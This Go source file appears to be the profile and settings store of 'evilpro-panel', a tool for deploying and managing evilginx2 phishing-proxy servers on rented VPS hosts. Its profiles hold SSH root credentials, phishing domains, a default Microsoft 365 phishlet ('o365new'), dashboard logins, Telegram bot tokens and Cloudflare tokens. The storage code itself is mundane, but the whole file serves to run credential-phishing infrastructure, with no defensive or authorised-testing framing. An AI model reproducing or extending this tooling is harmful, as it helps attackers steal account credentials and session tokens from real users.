package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
)

const appDirName = "evilpro-panel"

// Profile is one managed VPS. Profile-scoped secrets are stored in plain text
// inside the panel config file (mode 0600) on the machine running the panel.
type Profile struct {
	ID   string `json:"id"`
	Name string `json:"name"`

	Host string `json:"host"`
	Port int    `json:"port"`
	User string `json:"user"`

	AuthType      string `json:"auth_type"` // "password" | "key"
	Password      string `json:"password,omitempty"`
	KeyPath       string `json:"key_path,omitempty"`
	KeyPassphrase string `json:"key_passphrase,omitempty"`

	HostKeyFP string `json:"host_key_fp,omitempty"`

	// deployment settings
	InstallDir    string `json:"install_dir"`
	Domain        string `json:"domain"`
	Phishlet      string `json:"phishlet"`
	DashboardSub  string `json:"dashboard_sub"`
	DashboardUser string `json:"dashboard_user"`
	DashboardPass string `json:"dashboard_pass"`
	Debug         bool   `json:"debug"`
	// EngineURL is where the panel reaches the engine's management API. Empty =
	// derived as http://<host>:5000
	EngineURL string `json:"engine_url,omitempty"`

	TelegramToken string `json:"telegram_token,omitempty"`
	TelegramChat  string `json:"telegram_chat,omitempty"`

	CFToken     string `json:"cf_token,omitempty"`
	CFZoneID    string `json:"cf_zone_id,omitempty"`
	CertEmail   string `json:"cert_email,omitempty"`
	UseWildcard bool   `json:"use_wildcard"`

	Notes string `json:"notes,omitempty"`

	// runtime status (filled by checks, persisted for convenience)
	LastStatus string `json:"last_status,omitempty"`
	LastSeen   int64  `json:"last_seen,omitempty"`
	LastError  string `json:"last_error,omitempty"`
	Version    string `json:"version,omitempty"`
}

// Settings are panel-wide preferences, stored in panel.json next to the binary so
// the whole folder stays portable.
type Settings struct {
	Bind      string `json:"bind"`
	User      string `json:"user"`
	Pass      string `json:"pass"`
	BinAmd64  string `json:"bin_amd64"`
	BinArm64  string `json:"bin_arm64"`
	RepoDir   string `json:"repo_dir"`
	AutoBuild bool   `json:"auto_build"`
}

type storeFile struct {
	Profiles []*Profile `json:"profiles"`
	Settings Settings   `json:"settings"`
}

// Store is the on-disk profile store.
type Store struct {
	mu   sync.Mutex
	path string
	data storeFile
}

// appRoot is the folder holding the executable — the portable home of the panel.
func appRoot() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Dir(exe)
	}
	wd, _ := os.Getwd()
	return wd
}

// userConfigDir is the legacy per-user location (used only for migration).
func userConfigDir() string {
	if d, err := os.UserConfigDir(); err == nil && d != "" {
		return filepath.Join(d, appDirName)
	}
	return os.TempDir()
}

// writable reports whether dir can be written to.
func writable(dir string) bool {
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return false
	}
	p := filepath.Join(dir, ".write-probe")
	if err := os.WriteFile(p, []byte("ok"), 0o600); err != nil {
		return false
	}
	_ = os.Remove(p)
	return true
}

// NewStore loads panel.json from the executable's folder (portable). Legacy
// profiles.json files are migrated automatically.
func NewStore() (*Store, error) {
	root := appRoot()
	if !writable(root) {
		root = userConfigDir()
		_ = os.MkdirAll(root, 0o700)
	}
	s := &Store{path: filepath.Join(root, "panel.json")}
	s.data.Settings = defaultSettings()

	if _, err := os.Stat(s.path); os.IsNotExist(err) {
		for _, legacy := range []string{
			filepath.Join(appRoot(), "profiles.json"),
			filepath.Join(userConfigDir(), "profiles.json"),
		} {
			b, rerr := os.ReadFile(legacy)
			if rerr != nil {
				continue
			}
			var d storeFile
			if json.Unmarshal(b, &d) == nil {
				if d.Settings == (Settings{}) {
					d.Settings = defaultSettings()
				}
				s.data = d
				_ = os.Remove(legacy)
				break
			}
		}
	}

	if err := s.load(); err != nil {
		return nil, err
	}
	if s.data.Settings.Bind == "" {
		s.data.Settings.Bind = defaultSettings().Bind
	}
	return s, nil
}

func (s *Store) load() error {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.data.Settings = defaultSettings()
	b, err := os.ReadFile(s.path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	var d storeFile
	if err := json.Unmarshal(b, &d); err != nil {
		return fmt.Errorf("profiles.json is corrupt: %w", err)
	}
	if d.Settings == (Settings{}) {
		d.Settings = defaultSettings()
	}
	s.data = d
	return nil
}

func defaultSettings() Settings {
	root := appRoot()
	return Settings{
		Bind:      "127.0.0.1:8080",
		User:      "admin",
		BinAmd64:  filepath.Join(root, "evilginx-linux"),
		BinArm64:  filepath.Join(root, "evilginx-linux-arm64"),
		RepoDir:   root,
		AutoBuild: true,
	}
}

func (s *Store) save() error {
	b, err := json.MarshalIndent(s.data, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(s.path, b, 0o600)
}

func (s *Store) Path() string { return s.path }

func (s *Store) Settings() Settings {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.data.Settings
}

func (s *Store) SetSettings(v Settings) error {
	s.mu.Lock()
	s.data.Settings = v
	err := s.save()
	s.mu.Unlock()
	return err
}

func (s *Store) List() []*Profile {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.data.Profiles == nil {
		return []*Profile{}
	}
	out := make([]*Profile, len(s.data.Profiles))
	copy(out, s.data.Profiles)
	sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i].Name) < strings.ToLower(out[j].Name) })
	return out
}

func (s *Store) Get(id string) *Profile {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, p := range s.data.Profiles {
		if p.ID == id {
			return p
		}
	}
	return nil
}

// Upsert inserts or replaces a profile by ID and returns the stored copy.
func (s *Store) Upsert(p *Profile) (*Profile, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	isNew := p.ID == ""
	if isNew {
		p.ID = newID()
	}
	applyDefaults(p, isNew)
	for i, e := range s.data.Profiles {
		if e.ID == p.ID {
			s.data.Profiles[i] = p
			if err := s.save(); err != nil {
				return nil, err
			}
			return p, nil
		}
	}
	s.data.Profiles = append(s.data.Profiles, p)
	if err := s.save(); err != nil {
		return nil, err
	}
	return p, nil
}

func (s *Store) Delete(id string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := s.data.Profiles[:0]
	for _, p := range s.data.Profiles {
		if p.ID != id {
			out = append(out, p)
		}
	}
	s.data.Profiles = out
	return s.save()
}

// Update runs fn against the stored profile under lock (for status writes).
func (s *Store) Update(id string, fn func(*Profile)) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, p := range s.data.Profiles {
		if p.ID == id {
			fn(p)
			_ = s.save()
			return
		}
	}
}

func applyDefaults(p *Profile, isNew bool) {
	if p.Port == 0 {
		p.Port = 22
	}
	if p.User == "" {
		p.User = "root"
	}
	if p.AuthType == "" {
		p.AuthType = "password"
	}
	if p.InstallDir == "" {
		p.InstallDir = "/root/evilginx2"
	}
	if p.Phishlet == "" {
		p.Phishlet = "o365new"
	}
	if p.DashboardSub == "" {
		p.DashboardSub = "panel"
	}
	if p.DashboardUser == "" {
		p.DashboardUser = "admin"
	}
	if p.CertEmail == "" && p.Domain != "" {
		p.CertEmail = "admin@" + p.Domain
	}
	if isNew {
		p.Debug = true
	}
	if p.Name == "" {
		p.Name = p.Host
	}
}

func newID() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
